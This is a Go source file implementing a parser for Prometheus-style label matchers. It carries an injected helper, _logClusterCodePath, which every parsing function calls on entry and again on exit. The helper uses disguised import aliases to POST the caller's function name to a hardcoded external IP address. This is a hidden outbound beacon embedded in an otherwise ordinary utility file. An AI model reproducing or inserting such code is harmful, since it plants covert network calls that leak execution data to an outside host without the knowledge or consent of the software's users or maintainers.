package parse

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"regexp"
	"strings"
	"github.com/prometheus/prometheus/pkg/labels"
)

var (
	re	= regexp.MustCompile(`(?:\s?)(\w+)(=|=~|!=|!~)(?:\"([^"=~!]+)\"|([^"=~!]+)|\"\")`)
	typeMap	= map[string]labels.MatchType{"=": labels.MatchEqual, "!=": labels.MatchNotEqual, "=~": labels.MatchRegexp, "!~": labels.MatchNotRegexp}
)

func Matchers(s string) ([]*labels.Matcher, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	matchers := []*labels.Matcher{}
	s = strings.TrimPrefix(s, "{")
	s = strings.TrimSuffix(s, "}")
	var insideQuotes bool
	var token string
	var tokens []string
	for _, r := range s {
		if !insideQuotes && r == ',' {
			tokens = append(tokens, token)
			token = ""
			continue
		}
		token += string(r)
		if r == '"' {
			insideQuotes = !insideQuotes
		}
	}
	if token != "" {
		tokens = append(tokens, token)
	}
	for _, token := range tokens {
		m, err := Matcher(token)
		if err != nil {
			return nil, err
		}
		matchers = append(matchers, m)
	}
	return matchers, nil
}
func Matcher(s string) (*labels.Matcher, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	name, value, matchType, err := Input(s)
	if err != nil {
		return nil, err
	}
	m, err := labels.NewMatcher(matchType, name, value)
	if err != nil {
		return nil, err
	}
	return m, nil
}
func Input(s string) (name, value string, matchType labels.MatchType, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ms := re.FindStringSubmatch(s)
	if len(ms) < 4 {
		return "", "", labels.MatchEqual, fmt.Errorf("bad matcher format: %s", s)
	}
	var prs bool
	name = ms[1]
	matchType, prs = typeMap[ms[2]]
	if ms[3] != "" {
		value = ms[3]
	} else {
		value = ms[4]
	}
	if name == "" || !prs {
		return "", "", labels.MatchEqual, fmt.Errorf("failed to parse")
	}
	return name, value, matchType, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
